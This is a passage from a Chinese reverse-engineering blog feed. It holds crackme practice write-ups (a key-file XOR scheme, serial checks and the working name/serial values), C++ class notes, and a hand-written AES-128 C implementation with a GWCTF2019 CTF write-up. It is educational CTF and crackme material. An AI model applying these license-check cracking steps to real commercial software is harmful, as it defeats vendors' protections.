title="整体流程"></a>整体流程</h2><p>先打开CRACKME3.KEY文件，读取前十八个字符，然后对前14个字符异或加密，并且将异或后的值和0x12345678异或后与最后四位进行比较，前十四个密文为<a href="mailto:wanao@yahoo.cn">wanao@yahoo.cn</a>，然后动调得到最后四位字符，填充进去即可，注意大小端序</p><p>前十四位字符脚本</p><pre class="language-c" data-language="c"><code class="language-c">#include&lt;stdio.h&gt;#include&lt;string.h&gt;int main(){char name[]="wanao@yahoo.cn";char key='A';int num=0;for(int i=0;i&lt;strlen(name);++i){name[i]^=key++;num+=name[i];}printf("%s\n",name);printf("%d\n",num);int key2=0x12345678;return 0; } </code></pre><p><img src="/2022/04/03/Crackme%E7%AE%97%E6%B3%95/1648985143096.png" alt="最后四位字符"></p><p>最终效果</p><p><img src="/2022/04/03/Crackme%E7%AE%97%E6%B3%95/1648985203991.png"></p><h1 id="004-Acid-Bytes-2"><a href="#004-Acid-Bytes-2" class="headerlink" title="004-Acid Bytes.2"></a>004-Acid Bytes.2</h1><p>upx壳，去掉后很快就能找到比较</p><h1 id="006-ArturDents-CrackMe-2"><a href="#006-ArturDents-CrackMe-2" class="headerlink" title="006-ArturDents-CrackMe#2"></a>006-ArturDents-CrackMe#2</h1><p>先找到成功的函数</p><p><img src="/2022/04/03/Crackme%E7%AE%97%E6%B3%95/1649033728711.png" alt="验证正确的函数"></p><p>然后找到关键比较</p><p><img src="/2022/04/03/Crackme%E7%AE%97%E6%B3%95/1649033782005.png" alt="关键函数和跳转"></p><p>根据程序运行知道我们需要输入name和序列号，找到获取输入的函数</p><pre class="language-c" data-language="c"><code class="language-c">UINT GetDlgItemTextA(  [in]  HWND  hDlg,  [in]  int   nIDDlgItem,  [out] LPSTR lpString,  [in]  int   cchMax);//返回值是字符串的长度</code></pre><p>lpstring就是我们的输入</p><p><img src="/2022/04/03/Crackme%E7%AE%97%E6%B3%95/1649034100647.png" alt="关键函数"></p><p>箭头处可以看到cmp esi,5，而前面将函数的返回值也就是eax的值存储到esi中，所以这是长度比较，可以看到jge下一段是说name长度必须大于5。</p><p>再看下面红色框，获取我们的输入密码后，将input和password的地址存放到eax和ebx中，再把esi也就是name的长度存入ecx中</p><p>看加密函数</p><p><img src="/2022/04/03/Crackme%E7%AE%97%E6%B3%95/1649034490927.png" alt="关键加密函数"></p><p>先把eax存储的值取出，然后减去cl的值，再与ebx存放的值作比较</p><p>下面那个跳转是跳转到离开的函数</p><p>inc是自增，也就是让寄存器指向password和input下一个字符</p><blockquote><pre class="language-c" data-language="c"><code class="language-c">    mov cx, 循环的次数 (当遇到Loop标号时 cx就代表循环的次数)标号: (标明后面就是需要循环的循环体)    循环执行的程序代码    Loop 标号//注意：每执行一次loop，ecx的值都会减1</code></pre></blockquote><p>每执行一次loop，ecx的值都会减1</p><p>所以注意这一点即可</p><h2 id="最终"><a href="#最终" class="headerlink" title="最终"></a>最终</h2><p>name为99999，序列号为45678即可满足</p><p><img src="/2022/04/03/Crackme%E7%AE%97%E6%B3%95/1649034817650.png" alt="成功"></p><h1 id="007-reg"><a href="#007-reg" class="headerlink" title="007-reg"></a>007-reg</h1><p>这是一个共享软件，打开时需要我们输入UserName和SN，然后生成reg.dll，再打开软件验证。</p><p><img src="/2022/04/03/Crackme%E7%AE%97%E6%B3%95/1649040536751.png" alt="reg.dll内容"></p><p>先定位到关键的字符串</p><p><img src="/2022/04/03/Crackme%E7%AE%97%E6%B3%95/1649040650078.png" alt="关键字符串"></p><p>定位过去</p><p>可以看到先把字符串也就是reg.dll移动到eax中，然后call，再对al进行验证，所以这个函数应该是打开这个文件，没有这个文件的话就返回0</p><p><img src="/2022/04/03/Crackme%E7%AE%97%E6%B3%95/1649040684329.png"></p><p>接下来这一段应该是将dll文件的username和sn读取出来</p><p><img src="/2022/04/03/Crackme%E7%AE%97%E6%B3%95/1649040844910.png" alt="读取函数"></p><p>可以看到先把刚才读取的username和sn存放到edx和eax中，然后调用函数，调用结束后进行test和跳转，所以这个函数应该是加密函数</p><p><img src="/2022/04/03/Crackme%E7%AE%97%E6%B3%95/1649040977142.png" alt="加密函数"></p><p>加密函数中，先将变量的值清0，并且将username和sn存放到第一个和第二个参数中</p><p><img src="/2022/04/03/Crackme%E7%AE%97%E6%B3%95/1649041483499.png"></p><p>往下看，这里先把第二个参数（序列号）的地址读取到eax中，然后返回值和0x10作比较，那么这段应该就是计算序列号的长度</p><p><img src="/2022/04/03/Crackme%E7%AE%97%E6%B3%95/1649041704450.png" alt="关键比较"></p><p>在函数出事的地方，可以看到var_8=-8，然后ebp-8就是存放的序列号</p><p><img src="/2022/04/03/Crackme%E7%AE%97%E6%B3%95/1649042026513.png" alt="计算位置"></p><p>看一下函数调用的堆栈图，EBP+x就是压入的参数</p><p><img src="/2022/04/03/Crackme%E7%AE%97%E6%B3%95/1649042190963.png" alt="堆栈图"></p><p>下面这一段应该是对序列号验证，因为sub会让标志寄存器改变</p><p><img src="/2022/04/03/Crackme%E7%AE%97%E6%B3%95/1649042492337.png" alt="验证"></p><p><img src="/2022/04/03/Crackme%E7%AE%97%E6%B3%95/1649042642683.png"></p><p>FTSP汇编指令</p><p><a href="https://blog.csdn.net/liujiayu2/article/details/77711838">https://blog.csdn.net/liujiayu2/article/details/77711838</a></p><p>最后在这里的堆栈图找到了正确的序列号，长度正好是0x10</p><p><img src="/2022/04/03/Crackme%E7%AE%97%E6%B3%95/1649042753681.png"></p><p>先把两个参数存放的内容以及第三个参数也就是var_10的地址存储到ecx中，那么这个应该就是正确的序列号</p><p><img src="/2022/04/03/Crackme%E7%AE%97%E6%B3%95/1649042840725.png" alt="在调用前面的函数前"></p><p>函数有点复杂，有时间再看，据说后面有md5</p><p><img src="/2022/04/03/Crackme%E7%AE%97%E6%B3%95/1649043390270.png" alt="ZF标志位"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x00前言&quot;&gt;&lt;a href=&quot;#0x00前言&quot; class=&quot;headerlink&quot; title=&quot;0x00前言&quot;&gt;&lt;/a&gt;0x00前言&lt;/h1&gt;&lt;p&gt;因为汇编太水了，所以决定做一下CrackMe练习，可能不会一直弄，精力有限&lt;/p&gt;
&lt;h1 id=&quot;0x01</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>C++</title>
    <link href="https://gift1a.github.io/2022/03/31/C/"/>
    <id>https://gift1a.github.io/2022/03/31/C/</id>
    <published>2022-03-31T06:08:13.000Z</published>
    <updated>2022-04-20T01:22:38.694Z</updated>
    
    <content type="html"><![CDATA[<h1 id="C-类-this指针"><a href="#C-类-this指针" class="headerlink" title="C++类-this指针"></a>C++类-this指针</h1><h2 id="基础概念"><a href="#基础概念" class="headerlink" title="基础概念"></a>基础概念</h2><p>C语言中，结构体作为函数参数时传参传的是副本，而数组传递的是指针，所以我们将结构体作为参数时，最好传入指针</p><p>封装-就是将函数放入结构体内部，每次调用函数都会传递当前结构体的首地址，这样我们使用里面的变量就会比较方便</p><p>类-这个结构体就叫做类，在结构体插入函数时，结构体大小不变，因为函数不在结构体内部，可以看到sizeoftest=8，也就是两个int</p><p><img src="/2022/03/31/C/1648776748495.png"></p><p>对象-当使用使用类型创建变量时，创建的名称就叫做对象，比如Base base，Base是类，那么base就叫做对象</p><p>成员-里面的参数都是成员</p><p>成员函数-顾名思义，结构体中函数类型的成员</p><p><img src="/2022/03/31/C/1648776093255.png" alt="成员、类、对象"></p><h2 id="this指针"><a href="#this指针" class="headerlink" title="this指针"></a>this指针</h2><p>在反汇编中，调用类中的函数之前会先把结构体对象的首地址传入ecx中，ecx存放的值就是this指针，我们可以通过它来使用结构体成员，this-&gt;x,this-&gt;y(在类的函数中)，当函数参数和结构体变量同名时，使用this可以帮助编译器区分</p><p><img src="/2022/03/31/C/1648776666723.png" alt="调用类方法时的初始化操作"></p><p>我们知道指针可以进行加法减法操作，但是this指针不能进行这些操作，编译器不允许</p><h1 id="继承-构造-析构函数"><a href="#继承-构造-析构函数" class="headerlink" title="继承 构造-析构函数"></a>继承 构造-析构函数</h1><h2 id="构造函数"><a href="#构造函数" class="headerlink" title="构造函数"></a>构造函数</h2><p>首先他是个函数，其次他没有返回值，第三他跟当前的类名是完全一样的</p><p>他跟成员函数不同，他是在创建对象的时候使用的</p><p>作用：通过构造函数，在创建对象的同时给成员赋值</p><p><img src="/2022/03/31/C/1648776892810.png" alt="使用构造函数初始化"></p><p>注意事项：构造函数不是一定要有的，但是定义了构造函数就一定要使用，否则会报错</p><p>重载构造函数：多个构造函数，但是构造函数的参数个数不能一样</p><blockquote><p>只要函数的参数个数或者参数类型不一样，就可以存在多个同名函数，这些函数就是重载函数-成员函数</p></blockquote><h2 id="析构函数"><a href="#析构函数" class="headerlink" title="析构函数"></a>析构函数</h2><p>不是必须提供的</p><p>在类中，当我们malloc时，在堆中开辟空间，但是堆中的空间使用完一般要释放，而我们无法知道什么时候才可以释放掉这个堆的空间-因为其他函数可能会继续使用。</p><p>但是，当对象不再使用的时候（对象为局部变量时），堆就可以释放掉了</p><p>析构函数-无需调用、不能重载、名字与类名相同并在其之前加个~</p><pre class="language-c" data-language="c"><code class="language-c">~Persion(){ free(arr);}</code></pre><p><img src="/2022/03/31/C/1648777636920.png"></p><h2 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h2><p>本质是数据的复制</p><p>当在多个结构体存在相同的成员时，我们可以将相同的成员提取出来创建一个新的结构体，在使用时只需要</p><pre class="language-c" data-language="c"><code class="language-c">struct persion{int age;int sex;}struct student:persion{int grade;int count;}struct teacher:persion{int level;int p;}teacher s；student t;</code></pre><p>上面的代码在teacher和student结构体都有四个成员，相同成员有两个</p><p><img src="/2022/03/31/C/1648778055143.png" alt="相同部分"></p><p><img src="/2022/03/31/C/1648778255917.png" alt="修改后以及Student结构体大小"></p><p>1、Persion称为父类或者基类</p><p>2、teacher、student称为子类或者派生类</p><p>3、s、t称为对象或者实例</p><p>4、可以用父类的指针指向子类的对象</p><p>示例：</p><pre class="language-none"><code class="language-none">persion*pt=&amp;t;</code></pre><p><img src="/2022/03/31/C/1648713557915.png" alt="子、父类关系"></p><p>所以我们取得子类对象地址，就可以通过其来访问父类成员，但是不能访问子类成员，因为是Persion类型的指针</p><p><img src="/2022/03/31/C/1648778654017.png" alt="通过子类访问父类"></p><p>但是不能用子类指针指向父类对象</p><p>会一直往上继承父类</p><p><img src="/2022/03/31/C/1648714159618.png" alt="多重继承"></p><p>当多重继承出现相同的名称是，需要告诉编译器是谁的a，z.x::a,z.y::a​</p><p>可以同时继承两个父类</p><h1 id="权限控制"><a href="#权限控制" class="headerlink" title="权限控制"></a>权限控制</h1><blockquote><p>在类中，如果我们将函数写入会让类变得十分庞大，所以可以在类中进行函数声明，然后再去类外实现，但是我们需要告诉编译器，该函数属于谁，就需要用到 void 类名::函数名(函数参数)</p></blockquote><p><img src="/2022/03/31/C/1648777822123.png" alt="函数声明"></p><h2 id="public和private"><a href="#public和private" class="headerlink" title="public和private"></a>public和private</h2><p>存储的地方没变，只是告诉编译器不能直接访问private</p><p>可以修饰函数也可以修饰变量</p><p>public是指该成员在哪里都可以使用，不用担心被修改，所以一旦发布成public成员，是不能修改名字的。而private这个成员只用于内部使用，不要在其他地方使用</p><p>一般不想被外部访问的或者以后还会修改的就发布为private</p><p>常见的类的定义应该是把变量设为private，将修改private的方法-也就是函数发布为public，并在其中加入一定的限制</p><p>使用指针可访问private成员</p><p><img src="/2022/03/31/C/1648786703451.png" alt="class"></p><h2 id="class"><a href="#class" class="headerlink" title="class"></a>class</h2><p>class和struct的不同是权限不一样，class默认为private，struct则为public，注意class的构造函数也需要声明为public</p><h3 id="继承-1"><a href="#继承-1" class="headerlink" title="继承"></a>继承</h3><p>如果按照struct的格式进行继承，编译器会修改成员属性为private，所以如果需要访问，需要在继承时使用:public 父类名​​，可以看到我们只能继承public类的，一旦修改为private就会报错</p><p><img src="/2022/03/31/C/1648787335642.png" alt="父类继承"></p><p>private成员只能在当前类被使用，不能被继承</p><blockquote><p>编译器会默认生成构造函数，如果存在继承关系，他会先调用父类的构造函数，因为父辈的内容也需要初始化</p></blockquote><p><img src="/2022/03/31/C/1648792481902.png" alt="子类父类构造函数执行顺序"></p><p>我们可以先得到子类的地址，然后访问，即使父类的成员是private，也会被复制过来，只是不能直接访问，下面可以看到这是3个int的大小</p><p><img src="/2022/03/31/C/1648791796705.png"></p><p>但是我们可以知道子类的地址，然后通过指针访问私有的父类</p><p><img src="/2022/03/31/C/1648792223939.png" alt="指针访问私有父类"></p><h1 id="虚函数表"><a href="#虚函数表" class="headerlink" title="虚函数表"></a>虚函数表</h1><p>decription</p>]]></content>
    
    
    <summary type="html">C++学习</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>AES-C语言实现</title>
    <link href="https://gift1a.github.io/2022/03/29/AES-C%E8%AF%AD%E8%A8%80%E5%AE%9E%E7%8E%B0/"/>
    <id>https://gift1a.github.io/2022/03/29/AES-C%E8%AF%AD%E8%A8%80%E5%AE%9E%E7%8E%B0/</id>
    <published>2022-03-29T06:57:00.000Z</published>
    <updated>2022-04-20T01:21:19.382Z</updated>
    
    <content type="html"><![CDATA[<h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://ppppz.net/2022/01/31/AES-P-Z/">https://ppppz.net/2022/01/31/AES-P-Z/</a></p><p>无论是实现还是debug的时候都离不开大佬的博客</p><h1 id="源代码"><a href="#源代码" class="headerlink" title="源代码"></a>源代码</h1><p>实现的时候发现没学完整，导致中间实现的时候出现了问题，代码写的有点丑，我自己都看不下去了（</p><pre class="language-c" data-language="c"><code class="language-c">#include&lt;stdio.h&gt;#include&lt;string.h&gt;#include&lt;Windows.h&gt;//用于字节代换的S盒static const int S[16][16] ={0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5, 0x30, 0x01, 0x67, 0x2b, 0xfe, 0xd7, 0xab, 0x76,0xca, 0x82, 0xc9, 0x7d, 0xfa, 0x59, 0x47, 0xf0, 0xad, 0xd4, 0xa2, 0xaf, 0x9c, 0xa4, 0x72, 0xc0,0xb7, 0xfd, 0x93, 0x26, 0x36, 0x3f, 0xf7, 0xcc, 0x34, 0xa5, 0xe5, 0xf1, 0x71, 0xd8, 0x31, 0x15,0x04, 0xc7, 0x23, 0xc3, 0x18, 0x96, 0x05, 0x9a, 0x07, 0x12, 0x80, 0xe2, 0xeb, 0x27, 0xb2, 0x75,0x09, 0x83, 0x2c, 0x1a, 0x1b, 0x6e, 0x5a, 0xa0, 0x52, 0x3b, 0xd6, 0xb3, 0x29, 0xe3, 0x2f, 0x84,0x53, 0xd1, 0x00, 0xed, 0x20, 0xfc, 0xb1, 0x5b, 0x6a, 0xcb, 0xbe, 0x39, 0x4a, 0x4c, 0x58, 0xcf,0xd0, 0xef, 0xaa, 0xfb, 0x43, 0x4d, 0x33, 0x85, 0x45, 0xf9, 0x02, 0x7f, 0x50, 0x3c, 0x9f, 0xa8,0x51, 0xa3, 0x40, 0x8f, 0x92, 0x9d, 0x38, 0xf5, 0xbc, 0xb6, 0xda, 0x21, 0x10, 0xff, 0xf3, 0xd2,0xcd, 0x0c, 0x13, 0xec, 0x5f, 0x97, 0x44, 0x17, 0xc4, 0xa7, 0x7e, 0x3d, 0x64, 0x5d, 0x19, 0x73,0x60, 0x81, 0x4f, 0xdc, 0x22, 0x2a, 0x90, 0x88, 0x46, 0xee, 0xb8, 0x14, 0xde, 0x5e, 0x0b, 0xdb,0xe0, 0x32, 0x3a, 0x0a, 0x49, 0x06, 0x24, 0x5c, 0xc2, 0xd3, 0xac, 0x62, 0x91, 0x95, 0xe4, 0x79,0xe7, 0xc8, 0x37, 0x6d, 0x8d, 0xd5, 0x4e, 0xa9, 0x6c, 0x56, 0xf4, 0xea, 0x65, 0x7a, 0xae, 0x08,0xba, 0x78, 0x25, 0x2e, 0x1c, 0xa6, 0xb4, 0xc6, 0xe8, 0xdd, 0x74, 0x1f, 0x4b, 0xbd, 0x8b, 0x8a,0x70, 0x3e, 0xb5, 0x66, 0x48, 0x03, 0xf6, 0x0e, 0x61, 0x35, 0x57, 0xb9, 0x86, 0xc1, 0x1d, 0x9e,0xe1, 0xf8, 0x98, 0x11, 0x69, 0xd9, 0x8e, 0x94, 0x9b, 0x1e, 0x87, 0xe9, 0xce, 0x55, 0x28, 0xdf,0x8c, 0xa1, 0x89, 0x0d, 0xbf, 0xe6, 0x42, 0x68, 0x41, 0x99, 0x2d, 0x0f, 0xb0, 0x54, 0xbb, 0x16};//用于列混合乘法的表static int colM[4][4]{2,3,1,1,1,2,3,1,1,1,2,3,3,1,1,2};//密钥扩展存储的w表int w[44]={0};int round_const[10] = {0x01000000,0x02000000,0x04000000,0x08000000,0x10000000,0x20000000,0x40000000,0x80000000,0x1B000000,0x36000000};int CharToInt(char* key){int a[4] = { 0 };a[0] = (int) * key &lt;&lt; 24;a[1] = (int) * (key + 1) &lt;&lt; 16;a[2] = (int) * (key + 2) &lt;&lt; 8;a[3] = (int) * (key + 3);return a[0] | a[1] | a[2] | a[3];}int GetWordFromStr(char* key){int tmp=0;//因为最后返回的是一个整型，而我们传入的是四个字节，所以要先转为tmp = CharToInt(key);return tmp;}void IntToArray(int w, int* array){array[0] = (w &gt;&gt; 24)&amp;0xff;array[1] = (w &gt;&gt; 16)&amp;0xff;array[2] = (w &gt;&gt; 8) &amp; 0xff;array[3] = w &amp; 0xff;return ;}void ByteLeftMove(int* array){int tmp = array[0];for (int i = 0; i &lt; 3; ++i){array[i] = array[i + 1];}array[3] = tmp;return;}int ByteChange(int byte){int left = (byte &amp; 0xF0) &gt;&gt; 4;int right = (byte &amp; 0xF);return S[left][right];}int ArrayToInt(int* temp){int one = temp[0] &lt;&lt; 24;int two = temp[1] &lt;&lt; 16;int three = temp[2] &lt;&lt; 8;int four = temp[3];return one | two | three | four;}int T(int w, int round){int temp[4] = { 0 };IntToArray(w, temp);//先把int型的w转为数组，方便进行字循环操作ByteLeftMove(temp);//字节代换，此时需要用到S表for (int i = 0; i &lt; 4; ++i){temp[i]=ByteChange(temp[i]);}//轮常量异或，为了方便异或，先把数组转为int整型w=ArrayToInt(temp);w ^= round_const[round];return w;}void ExtendKey(char* key){//先生成一个子表，在此基础上扩展-子密钥初始化for (int i = 0; i &lt; 4; ++i){w[i] = GetWordFromStr(key + i * 4);//每四个字节生成一个w数组的元素，便于待会异或}//密钥扩展for (int i = 4,j=0; i &lt; 44; ++i){if (i % 4 == 0)//根据是否是4的整数倍，进行操作{//j表示轮数，因为最终为10轮，所以只要是4的倍数就需要+1w[i] = w[i - 4] ^ T(w[i - 1], j);j++;}elsew[i] = w[i - 4] ^ w[i - 1];}return;}void PlainToMatrix(char* Plain, int array[4][4]){//矩阵 存放和二维数组不同，这里需要注意一下int k = 0;for (int i = 0; i &lt; 4; ++i){for (int j = 0; j &lt; 4; ++j){array[j][i] = Plain[k++];}}return;}void w_To_matrix(int array[4][4]){//先把每个w转为数组，然后再依次赋值给二维数组for (int i = 0; i &lt; 4; ++i){int w_temp[4];//使用临时数组存放w的值IntToArray(w[i],w_temp);for (int j = 0; j &lt; 4; ++j){array[j][i] = w_temp[j];}}return;}void Matrix_Bytechange(int array[4][4]){for (int i = 0; i &lt; 4; ++i){for (int j = 0; j &lt; 4; ++j){array[i][j]=ByteChange(array[i][j]);}}return;}//行移位void RowMove(int array[4][4]){//第二行往左移动一个字符int temp = array[1][0];for (int i = 0; i &lt; 3; ++i){array[1][i] = array[1][i + 1];}array[1][3] = temp;//第三行往左移动两个字符int temp2 = array[2][0];int temp3 = array[2][1];array[2][0] = array[2][2];array[2][1] = array[2][3];array[2][2] = temp2;array[2][3] = temp3;//第四行往左移动三个字符,相当于往右移动一位int temp4 = array[3][3];for (int i = 3; i &gt;= 0; --i){array[3][i] = array[3][i - 1];}array[3][0] = temp4;return;}unsigned char XTIME(unsigned char x){return ((x &lt;&lt; 1) ^ ((x &amp; 0x80) ? 0x1b : 0x00));}//GF基于有限域上的运算int GFMul(int a, int b){unsigned char temp[8] = { a };unsigned char tempmultiply = 0x00;int i = 0;for (i = 1; i &lt; 8; i++){temp[i] = XTIME(temp[i - 1]);}tempmultiply = (b &amp; 0x01) * a;for (i = 1; i &lt;= 7; i++){tempmultiply ^= (((b &gt;&gt; i) &amp; 0x01) * temp[i]);}return tempmultiply;}//列混合void Line_Change(int array[4][4]){//这里需要用到列混合异或的表colMint temparray[4][4] = { 0 };for (int i = 0; i &lt; 4; ++i){for (int j = 0; j &lt; 4; ++j){temparray[i][j] = array[i][j];}}//列混合的矩阵计算方式不同for (int i = 0; i &lt; 4; ++i){for (int j = 0; j &lt; 4; ++j){array[i][j] = GFMul(colM[i][0], temparray[0][j]) ^GFMul(colM[i][1], temparray[1][j]) ^GFMul(colM[i][2], temparray[2][j]) ^GFMul(colM[i][3], temparray[3][j]);}}return;}//将矩阵的每一列转为整型int Matrix_ArraytoInt(int one, int two, int three, int four){one &lt;&lt;= 24;two &lt;&lt;= 16;three &lt;&lt;= 8;return one | two | three | four;}//将加密后的每一个整型还原到矩阵的每一列int Restore_Matrix(int temp,int num){switch(num){case 0:return temp &gt;&gt; 24;case 1:return temp &gt;&gt; 16;case 2:return temp &gt;&gt; 8;case 3:return temp;}}//轮密钥加void AddRoundKey(int array[4][4], int round){//对每一轮都要进行异或操作,为了方便异或操作，先转为整型int temp[4] = { 0 };//待会可以直接和w[round]异或，四轮for (int i = 0; i &lt; 4; ++i){IntToArray(w[round * 4 + i], temp);for (int j = 0; j &lt; 4; ++j){array[j][i] ^= temp[j];}}return;}//最终轮void FinalRound(int matrix[4][4]){Matrix_Bytechange(matrix);//行移位RowMove(matrix);//轮密钥加，注意是对应轮数的密钥AddRoundKey(matrix, 10);return;}//将矩阵还原到字符串void MatrixToPlain(char* String, int array[4][4]){int k = 0;for (int i = 0; i &lt; 4; ++i){for (int j = 0; j &lt; 4; ++j){String[k++] = array[j][i];}}//字符串以'\0'结尾String[k] = 0;}void AES_Encode(char* p, int plen, char* key){//先判断明文长度是否为16的倍数，判断密钥是否为16个字节int Text_len = strlen(p);if (strlen(p) % plen != 0){printf("长度出错，明文长度需为十六的倍数");exit(0);}//密钥长度if (strlen(key) != 16){printf("密钥长度出错，密钥长度必须为十六个字节");}//密钥扩展，通过子密钥生成ExtendKey(key);//下面进行初始变换，先把明文放入矩阵中，再与第0轮的密钥进行对应位置的逐字节异或int matrix[4][4] = { 0 };for (int k = 0; k &lt; plen; k += 16){PlainToMatrix(p+k, matrix);//明文矩阵和密钥矩阵进行轮密钥加，也就是逐字节异或AddRoundKey(matrix,0);  //问题//进行九轮相同的加密for (int i = 1; i &lt; 10; ++i){//字节代换Matrix_Bytechange(matrix);//行移位RowMove(matrix);//列混合Line_Change(matrix);//轮密钥加，注意是对应轮数的密钥AddRoundKey(matrix, i);}FinalRound(matrix);//最后还要把矩阵还原为字符串MatrixToPlain(p+k, matrix);}}int main(){char key[] = "ABCDEFGHIJKLMNOP";char PlainText[] = "ABCDEFGHIJKLMNOP";AES_Encode(PlainText, 16, key);printf("加密后的密文为:");for (int i = 0; i &lt; strlen(PlainText); ++i){printf("0x%X,",PlainText[i]&amp;0xff);}return 0;}</code></pre><h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><p>看完AES的代码，做点AES的题巩固一下</p><h2 id="GWCTF2019-re3"><a href="#GWCTF2019-re3" class="headerlink" title="GWCTF2019-re3"></a>GWCTF2019-re3</h2><h3 id="考点-SMC、AES"><a href="#考点-SMC、AES" class="headerlink" title="考点-SMC、AES"></a>考点-SMC、AES</h3><h3 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h3><p>这一段是SMC的解密代码，加上前面的mprotect名称，也可以大致确定，动调跑一下即可</p><p><img src="/2022/03/29/AES-C%E8%AF%AD%E8%A8%80%E5%AE%9E%E7%8E%B0/1648542144906.png" alt="SMC"></p><p>init_key函数</p><p><img src="/2022/03/29/AES-C%E8%AF%AD%E8%A8%80%E5%AE%9E%E7%8E%B0/1648542218644.png"></p><p>看到了各种table，开始不知道是什么，但是不影响，因为并没有对我们的输入进行处理，到后面可以知道这是个生成密钥的函数</p><p> <img src="/2022/03/29/AES-C%E8%AF%AD%E8%A8%80%E5%AE%9E%E7%8E%B0/IVT%7DV%7DA4I1PSHR2NX%60EP_F.png" alt="key_generate"> </p><p>刚好长度为16，对应AES的密钥长度</p><p><img src="/2022/03/29/AES-C%E8%AF%AD%E8%A8%80%E5%AE%9E%E7%8E%B0/1648542330250.png" alt="encode函数"></p><p>可以看到中间有三个函数，最后的循环对加密后的数据进行比较</p><p>而三个函数中，有两个是一样的，这是因为将我们32长度的flag分成了两段进行加密，因为这是128bits的AES加密</p><p><img src="/2022/03/29/AES-C%E8%AF%AD%E8%A8%80%E5%AE%9E%E7%8E%B0/1648542489870.png" alt="key_add"></p><p><img src="/2022/03/29/AES-C%E8%AF%AD%E8%A8%80%E5%AE%9E%E7%8E%B0/1648542517975.png" alt="key_add"></p><p>对比AES的w表生成方式，不难看出这一段是生成w表，不过有点不同，因为我们是在矩阵中进行，并且每一次将一个w元素转为int型，倒是+0x3FFFFFFF那段不知道什么意思，网上说是无穷大的数，这里不是很影响我们的分析，就不纠结了</p><p><img src="/2022/03/29/AES-C%E8%AF%AD%E8%A8%80%E5%AE%9E%E7%8E%B0/1648542810371.png" alt="AES_Encode"></p><p>可以看出这里就是加密过程，因为先进行第0轮的轮密钥加</p><p><img src="/2022/03/29/AES-C%E8%AF%AD%E8%A8%80%E5%AE%9E%E7%8E%B0/1648542901636.png" alt="Add_Round_Key"></p><p>然后进行字节替换</p><p><img src="/2022/03/29/AES-C%E8%AF%AD%E8%A8%80%E5%AE%9E%E7%8E%B0/1648542937639.png" alt="ByteReplace"></p><p>行移位，中间有很多暂时变量，然后实现互换</p><p><img src="/2022/03/29/AES-C%E8%AF%AD%E8%A8%80%E5%AE%9E%E7%8E%B0/1648542961376.png" alt="RowMov"></p><p>列混合</p><p><img src="/2022/03/29/AES-C%E8%AF%AD%E8%A8%80%E5%AE%9E%E7%8E%B0/1648543006962.png" alt="MixLine"></p><p>重复进行9轮，最后进行第十轮（不包括列混合）</p><p><img src="/2022/03/29/AES-C%E8%AF%AD%E8%A8%80%E5%AE%9E%E7%8E%B0/1648543079057.png" alt="第十轮"></p><p>至此key和密文都有了，解密</p><p> <img src="/2022/03/29/AES-C%E8%AF%AD%E8%A8%80%E5%AE%9E%E7%8E%B0/GN37@K06OO18H7U6%5DX8W%5DYY.png"> </p>]]></content>
    
    
    <summary type="html">AES-128-None-C语言</summary>
    
    
    
    
    <category term="Reverse" scheme="https://gift1a.github.io/tags/Reverse/"/>
    
  </entry>
  
</feed>
